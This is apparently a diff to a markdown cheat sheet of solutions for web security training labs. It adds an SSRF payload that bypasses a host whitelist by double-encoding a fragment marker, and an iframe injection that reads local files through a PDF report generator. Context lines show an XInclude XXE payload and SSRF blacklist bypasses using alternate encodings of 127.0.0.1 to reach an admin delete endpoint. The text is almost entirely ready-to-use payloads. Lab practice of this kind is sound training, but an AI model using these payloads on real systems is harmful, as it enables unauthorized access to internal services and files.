@@ -84,4 +84,7 @@ productId=<food+xmlns%3axi%3d"http%3a//www.w3.org/2001/XInclude"><xi%3ainclude+p
 - ==SSRF with blacklist-based input filter== - Experiment with different forms of localhost: e.g.: Use an alternative IP representation of 127.0.0.1, such as 2130706433, 017700000001, or 127.1 and case variation for /admin, e.g. /Admin. 
   Check stock, then change request body to:
   stockApi=http://127.1/Admin/delete?username=carlos
+- ==SSRF with whitelist-based input filter== - stockApi=http://localhost:80%2523@stock.weliketoshopcom/admin/
+- ==Download report as PDF== - `<iframe src='http://localhost:port/file' height='100' width='100'>`
+  https://www.virtuesecurity.com/kb/wkhtmltopdf-file-inclusion-vulnerability-2/
 
